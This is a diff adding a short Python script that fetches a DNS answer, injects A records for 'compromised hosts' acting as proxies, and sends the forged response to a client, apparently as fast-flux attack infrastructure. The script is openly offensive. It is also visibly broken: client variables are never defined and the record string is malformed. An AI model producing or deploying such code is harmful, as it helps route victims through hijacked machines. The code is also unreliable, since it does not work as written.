@@ -1,0 +1,27 @@
+import dnslib
+import socket
+
+# Replace with the IP address of the DNS server
+dns_server = "8.8.8.8"
+
+# Replace with the domain name that you control
+domain_name = "example.com"
+
+# Replace with the IP addresses of the compromised hosts that will act as proxies
+proxy_addresses = ["10.0.0.1", "10.0.0.2", "10.0.0.3"]
+
+# Create a DNS query for the domain name
+query = dnslib.DNSRecord.question(domain_name)
+
+# Send the DNS query to the DNS server
+dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+dns_socket.sendto(query.pack(), (dns_server, 53))
+
+# Receive the DNS response from the DNS server
+response = dnslib.DNSRecord.parse(dns_socket.recv(4096))
+
+# Modify the DNS response to include the IP addresses of the compromised hosts
+response.add_answer(*dnslib.RR.fromZone("example.com A " + " ".join(proxy_addresses)))
+
+# Send the modified DNS response to the client
+dns_socket.sendto(response.pack(), (client_address, client_port))
